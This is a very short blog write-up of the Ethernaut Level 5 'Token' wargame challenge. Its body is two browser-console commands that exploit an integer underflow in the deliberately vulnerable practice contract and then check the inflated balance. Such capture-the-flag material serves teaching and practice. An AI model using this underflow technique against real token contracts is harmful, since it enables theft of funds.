+++
title = 'Ethernaut Level 5 - Token'
date = 2024-08-04
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Integer overflow to win'
tags = [ 'writeups' , 'blockchain' ]
+++

```js
await contract.transfer(contract.address, 21);
Number(await contract.balanceOf(player));
```
